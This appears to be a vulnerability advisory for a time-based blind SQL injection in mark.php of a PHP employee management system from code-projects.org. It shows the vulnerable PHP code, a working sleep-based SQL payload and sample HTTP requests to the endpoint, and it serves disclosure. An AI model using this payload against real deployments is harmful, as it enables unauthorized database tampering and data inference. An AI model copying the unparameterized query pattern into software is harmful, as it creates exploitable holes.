## EMPLOYEE_MANAGEMENT_SYSTEM file `370project/mark.php` contains a SQL Injection (time-based blind) vulnerability and improper input validation

Impact of the vulnerability
The application accepts attacker-controlled POST parameters and uses them in SQL statements without parameterization. This may allow an attacker to:

- Manipulate database queries/updates (unauthorized modification depending on DB permissions)
- Infer database behavior/data using blind techniques (e.g., time delays)
- Trigger runtime warnings/errors (information disclosure about file paths/line numbers; reduced stability)

### Payload:

(select*from(select+sleep(5)union/**/select+1)a)

```
(select*from(select+sleep(5)union/**/select+1)a)
```

### POC:

The vulnerable endpoint is `POST /mark.php`. The `eid` (and also `pid`) POST parameters are used directly in SQL update statements:

$eid = mysqli_real_escape_string($conn, $_POST['eid']);

$pid = mysqli_real_escape_string($conn, $_POST['pid']);

...

$result = mysqli_query($conn, "UPDATE `project` SET `mark`='$mark' WHERE eid=$eid and pid = $pid");

$result = mysqli_query($conn, "UPDATE `rank` SET `points`='$upPoint' WHERE eid=$eid");

$result = mysqli_query($conn, "UPDATE `salary` SET `bonus`='$upBonus' ,`total`='$upSalary' WHERE id=$eid");

Additionally, arithmetic is performed on user-supplied values, which is why you observed warnings like “A non-numeric value encountered”:

$upPoint = $points+$mark;

$upBonus = $bonus +  $mark;

$upSalary = $base + ($upBonus*$base)/100;

- Baseline request (normal values; normal response time):

POST /mark.php HTTP/1.1

Host: 370project:82

Content-Type: application/x-www-form-urlencoded

Connection: close

pname=&firstName=&duedate=&subdate=&mark=1&eid=101&pid=215&points=0&base=55000&bonus=0&total=55000&update=

- Time-delay verification request (in an authorized test environment, place a URL-encoded time-delay expression into `eid`):

POST /mark.php HTTP/1.1

Host: 370project:82

Content-Type: application/x-www-form-urlencoded

Connection: close

pname=&firstName=&duedate=&subdate=&mark=&eid=<TIME_DELAY_PAYLOAD_URLENCODED>&pid=215&points=&base=&bonus=&total=&update=

Expected result:

- The verification request is delayed by approximately `5` compared to the baseline (time-based SQLi indication).
- The response may also include PHP warnings about non-numeric values, which confirms missing server-side validation and leaks internal path/line information.

### Sources download:

https://code-projects.org/employee-management-system-in-php-with-source-code/

```
https://code-projects.org/employee-management-system-in-php-with-source-code/
```





![image-20260409150921737](https://raw.githubusercontent.com/zzzxc643/images/main/image/image-20260409150921737.png)